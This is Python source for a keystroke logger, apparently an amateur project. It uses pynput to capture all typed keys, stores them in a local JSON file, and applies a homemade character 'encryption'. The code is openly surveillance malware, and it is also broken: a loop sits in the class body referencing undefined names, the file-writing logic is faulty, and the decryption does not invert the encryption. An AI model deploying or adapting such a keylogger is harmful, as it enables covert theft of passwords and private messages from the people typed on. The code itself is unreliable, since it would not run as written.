
from pynput import keyboard
import json
import os
import time
from datetime import datetime

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.key_logger_service()


    def key_logger_service(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        listener.join()

    def on_press(self, key):
        try:
            self.logger += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.logger += " "
            elif key == keyboard.Key.enter:
                self.logger += "\n"
            elif key == keyboard.Key.tab:
                self.logger += "\t"
            else:
                self.logger += str(key)

    def write_of_file(self):
        try:
            with open("my_keylogger.json","r") as f:
                data = json.load(f)
            if isinstance(data,list):
                data += self.logger
                os.remove("my_keylogger.json")
                write_of_file(data)
            else:
                data = self.logger
        except:
            with open("my_keylogger.json","w") as f:
                json.dump(self.logger, f, indent=4)
                self.logger = ""


    def encryption(self):
        array_encryption = ""
        for word in self.logger:
            nem = ord(word)+2
            nem = (nem ** 2)
            if nem > 122:
                nem -= 57
            array_encryption += (chr(nem))
        return array_encryption

    def Decryption(self,logger):
        array_encryption = ""
        for word in logger:
            nem = ord(word)
            if nem + 57 > 122:
                nem += 57
            nem **= 0.5
            nem -= 2
            array_encryption += (chr(int(nem)))
        return array_encryption
    while True:
        time.sleep(10)
        write_of_file(self.logger)


